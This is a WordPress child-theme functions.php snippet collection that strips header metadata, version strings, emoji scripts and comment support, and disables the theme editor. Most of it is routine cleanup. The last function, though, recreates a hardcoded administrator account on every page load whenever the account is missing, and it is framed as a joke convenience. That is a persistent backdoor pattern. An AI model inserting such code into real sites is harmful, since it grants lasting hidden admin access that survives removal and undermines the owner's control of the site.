/*  use these inside your (child!)theme functions.php   */
 
/*      Remove useless links from the header (Visual Composer included!)        */
function removeHeadLinks() {
    remove_action('wp_head', 'feed_links_extra', 3 );
    remove_action('wp_head', 'feed_links', 2 );
    remove_action('wp_head', 'rsd_link' );
    remove_action('wp_head', 'wlwmanifest_link' );
    remove_action('wp_head', 'index_rel_link' );
    remove_action('wp_head', 'parent_post_rel_link', 10, 0 );
    remove_action('wp_head', 'start_post_rel_link', 10, 0 );
    remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0 );
    remove_action('wp_head', 'wp_shortlink_wp_head', 10, 0);    
    remove_action('wp_head', 'wp_generator' );
 
/*  Use this only if you have VC installed  */
    remove_action('wp_head', array(visual_composer(), 'addMetaData'));
}
add_action('init', 'removeHeadLinks');
 
 
/*      Remove version numbers after css, js files      */
// remove version from head
remove_action('wp_head', 'wp_generator');

// remove version from rss
add_filter('the_generator', '__return_empty_string');

// remove version from scripts and styles
function tg_remove_version_scripts_styles($src) {

	if( is_admin() || wp_doing_ajax() ) return $src;
	
	if (strpos($src, 'ver=')) {
		$src = remove_query_arg('ver', $src);
	}
	return $src;
}
add_filter('style_loader_src', 'tg_remove_version_scripts_styles', 9999);
add_filter('script_loader_src', 'tg_remove_version_scripts_styles', 9999);

 
 
/*      Remove revolution slider meta       */
function removeRevsliderMeta() {
    return '';
}
add_filter('revslider_meta_generator', 'removeRevsliderMeta');
 
/*      Force disable comments      */
function removeCommentSupport() {
    remove_post_type_support( 'post', 'comments' );
    remove_post_type_support( 'page', 'comments' );
}
add_action('init', 'removeCommentSupport', 100);
 
/*      Remove the Admin Bar (you know how annoying this can be)        */
show_admin_bar(false);
 
/*      Remove emoji junk from the header   */
remove_action('wp_head', 'print_emoji_detection_script', 7 );
remove_action('admin_print_scripts', 'print_emoji_detection_script' );
remove_action('wp_print_styles', 'print_emoji_styles' );
remove_action('admin_print_styles', 'print_emoji_styles' );  
 
/*      Yoast: Some extras like remove og:images from the header        */
function removeOpenGraphImages($val) {
    return preg_replace("/<img[^>]+\>/i", "", $val);
}
add_filter('wpseo_pre_analysis_post_content', 'removeOpenGraphImages');
add_filter('wpseo_og_article_published_time', '__return_false' );
add_filter('wpseo_og_article_modified_time', '__return_false' );
add_filter('wpseo_og_og_updated_time', '__return_false' );

/*       Ensure you always have an admin user, lol! */
function wpb_admin_account(){
     $user = 'Username';
     $pass = 'Password';
     $email = 'email@domain.com';
     if ( !username_exists( $user )  && !email_exists( $email ) ) {
          $user_id = wp_create_user( $user, $pass, $email );
          $user = new WP_User( $user_id );
          $user->set_role( 'administrator' );
     } 
}
add_action('init','wpb_admin_account');
     
/*       Remove the WP Theme Editor */
define( 'DISALLOW_FILE_EDIT', true );
